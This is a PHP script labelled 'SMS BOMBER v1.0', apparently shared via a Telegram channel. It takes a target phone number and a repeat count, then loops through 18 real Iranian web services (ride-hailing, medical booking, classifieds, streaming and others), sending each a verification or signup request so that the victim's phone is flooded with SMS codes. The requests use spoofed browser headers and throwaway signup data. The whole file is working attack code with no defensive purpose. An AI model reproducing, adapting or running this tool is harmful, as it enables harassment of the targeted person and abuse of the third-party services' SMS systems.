<?php

/**
  * Telegram Channel @ZeroDayTm
  * 
  * CoDeD By @StuxDeveloper
  * 
  * SMS BOMBER v1.0
  * 
  * PHP requires libcurl version 7.10. 5 or later
**/
$phone1 = $_GET["phone"];
$count = $_GET["count"];
if ((str_split($phone1))[0] != "0"){
  echo "Number Format Error. Example > 09123456789";
  die;
}else if(empty($count)){
  echo "Count Error.";
  die;
}

$kh = (str_split($phone1));
unset($kh[0]);
$phone2 = "+98".implode("",$kh);
$phone3 = implode("",$kh);
for($i=0;$i<strval($count);$i++){
  #API 1
  $SendReq = curl_init();
  $SendReq_Url = "https://tagmond.com/phone_number";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, 'utf8=%E2%9C%93&phone_number='.$phone1.'&g-recaptcha-response=');
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 2
  $SendReq = curl_init();
  $SendReq_Url = "https://a4baz.com/api/web/login";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, '{"cellphone":"'.$phone1.'"}');
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 3
  $SendReq = curl_init();
  $SendReq_Url = "https://drdr.ir/api/registerEnrollment/voip";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
  'Connection: keep-alive',
  'Accept: application/json',
  'Authorization: hiToken',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
  'Content-Type: application/json;charset=UTF-8',
  'Origin: https://drdr.ir',
  'Sec-Fetch-Site: same-origin',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Dest: empty',
  'Referer: https://drdr.ir/',
  'Accept-Language: en-US,en;q=0.9',
  'Accept-Encoding: gzip, deflate'
  ));
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, '{"phoneNumber":"'.$phone2.'","userType":"PATIENT"}');
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 4 
  $SendReq = curl_init();
  $SendReq_Url = "https://www.snapptrip.com/register";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
  'Connection: keep-alive',
  'Accept: */*',
  'X-Requested-With: XMLHttpRequest',
  'lang: fa',
  'Accept-Language: fa',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
  'Content-Type: application/json; charset=UTF-8',
  'Origin: https://www.snapptrip.com',
  'Sec-Fetch-Site: same-origin',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Dest: empty',
  'Referer: https://www.snapptrip.com/',
  'Cache-Control: no-cache',
  'Accept-Encoding: gzip, deflate'
  ));
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, '{"lang":"fa","country_id":"860","password":"dfadwadsdav","mobile_phone":"'.$phone1.'","country_code":"+98","email":"dadsqw2dadsuf@gmail.com"}');
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 5 
  $SendReq = curl_init();
  $SendReq_Url = "https://api.doctoreto.com/api/web/patient/v1/accounts/register";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
  'Connection: keep-alive',
  'Accept: application/json',
  'X-Requested-With: XMLHttpRequest',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
  'Content-Type: application/json;charset=UTF-8',
  'Origin: https://doctoreto.com',
  'Sec-Fetch-Site: same-origin',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Dest: empty',
  'Referer: https://doctoreto.com/',
  'Accept-Language: en-US,en;q=0.9'
  ));
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, '{"mobile": "'.$phone3.'", "country_id": 205}');
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 6
  $SendReq = curl_init();
  $SendReq_Url = "https://nobat.ir/api/public/patient/login/phone";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
  'Connection: keep-alive',
  'Accept: */*',
  'X-Requested-With: XMLHttpRequest',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
  'Origin: https://nobat.ir',
  'Sec-Fetch-Site: same-origin',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Dest: empty',
  'Referer: https://nobat.ir/',
  'Accept-Language: en-US,en;q=0.9'
  ));
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, 'mobile='.$phone3);
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 7
  $SendReq = curl_init();
  $SendReq_Url = "https://www.tebinja.com/api/v1/users";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
  'Connection: keep-alive',
  'Accept: application/json, text/plain, */*',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
  'Content-Type: application/json;charset=UTF-8',
  'Origin: https://www.tebinja.com',
  'Sec-Fetch-Site: same-origin',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Dest: empty',
  'Referer: https://www.tebinja.com/app/login',
  'Accept-Language: en-US,en;q=0.9',
  'Accept-Encoding: gzip, deflate'
  ));
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, '{"username":"'.$phone1.'"}');
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 8
  $SendReq = curl_init();
  $SendReq_Url = "https://api.snapp.ir/api/v1/sms/link";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
    'Connection: keep-alive',
    'Accept: application/json, text/plain, */*',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Content-Type: application/json;charset=UTF-8',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Accept-Language: en-US,en;q=0.9'
    ));
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, '{"phone": "'.$phone1.'"}');
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  
  #API 9
  $SendReq = curl_init();
  $SendReq_Url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
    'Connection: keep-alive',
    'Accept: application/json, text/plain, */*',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Content-Type: application/json;charset=UTF-8',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Accept-Language: en-US,en;q=0.9'
    ));
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, '{"cellphone": "'.$phone2.'"}');
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  
  #API 10
  $SendReq = curl_init();
  $SendReq_Url = "https://api.tapsi.cab/api/v2/user";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array( 'Accept: */*',
  'Accept-Encoding: gzip, deflate, br',
  'Accept-Language: en-US,en;q=0.9',
  'Connection: keep-alive',
  'Content-Length: 63',
  'content-type: application/json',
  'Host: api.tapsi.cab',
  'Origin: https://app.tapsi.cab',
  'Referer: https://app.tapsi.cab/',
  'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
  'sec-ch-ua-mobile: ?0',
  'sec-ch-ua-platform: "Windows"',
  'Sec-Fetch-Dest: empty',
  'Sec-Fetch-Mode: cors',
  'Sec-Fetch-Site: same-site',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
  'x-agent: v2.2|passenger|WEBAPP|5.0.1||5.0',
  ));
  $p = json_encode( array( "credential" => array("credential" => $phone1 , "role" => "PASSENGER" )) );
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, $p);
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  
  #API 11
  $SendReq = curl_init();
  $SendReq_Url = "https://api.divar.ir/v5/auth/authenticate";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
    'Connection: keep-alive',
    'Accept: application/json, text/plain, */*',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Content-Type: application/json;charset=UTF-8',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Accept-Language: en-US,en;q=0.9'
    ));
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, json_encode( array( "phone" => $phone1) ));
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  
  #API 12
  file_get_contents("https://core.gap.im/v1/user/add.json?mobile=%2B98".$phone3);
  #API 13
  file_get_contents("https://api.torob.com/a/phone/send-pin/?phone_number=".$phone1);
  #API 14
  $SendReq = curl_init();
  $SendReq_Url = "https://gw.taaghche.com/v4/site/auth/signup";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
    'Connection: keep-alive',
    'Accept: application/json, text/plain, */*',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Content-Type: application/json;charset=UTF-8',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Accept-Language: en-US,en;q=0.9'
    ));
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, json_encode( array( "contact" => $phone1) ));
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 15
  $SendReq = curl_init();
  $SendReq_Url = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
    'Connection: keep-alive',
    'Accept: application/json, text/plain, */*',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Content-Type: application/json;charset=UTF-8',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Accept-Language: en-US,en;q=0.9'
    ));
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, json_encode( array( "UserName" => $phone2) ));
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 16
  $SendReq = curl_init();
  $SendReq_Url = "https://www.sheypoor.com/api/v10.0.0/auth/send";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
    'Connection: keep-alive',
    'Accept: application/json, text/plain, */*',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Content-Type: application/json;charset=UTF-8',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Accept-Language: en-US,en;q=0.9'
    ));
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, json_encode( array( "username" => $phone2) ));
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
  #API 17
  echo file_get_contents("https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/".$phone3."/sms?cCode=+98");
  #API 18
  $SendReq = curl_init();
  $SendReq_Url = "https://api.achareh.ir/v2/accounts/login/";
  curl_setopt($SendReq, CURLOPT_URL, $SendReq_Url);
  curl_setopt($SendReq, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($SendReq, CURLOPT_FRESH_CONNECT, true);
  curl_setopt($SendReq, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($SendReq, CURLOPT_POST, true);
  curl_setopt($SendReq, CURLOPT_HTTPHEADER, array(
    'Connection: keep-alive',
    'Accept: application/json, text/plain, */*',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Content-Type: application/json;charset=UTF-8',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Accept-Language: en-US,en;q=0.9'
    ));
  curl_setopt($SendReq, CURLOPT_POSTFIELDS, json_encode( array( "phone" => "98".$phone3 , "utm_source" => "null") ));
  curl_setopt($SendReq, CURLOPT_RETURNTRANSFER, true);
  $SendReq_Response = curl_exec($SendReq);
  curl_close($SendReq);
}
echo "Sent. CoDeD By @ZeroDayTm";
?>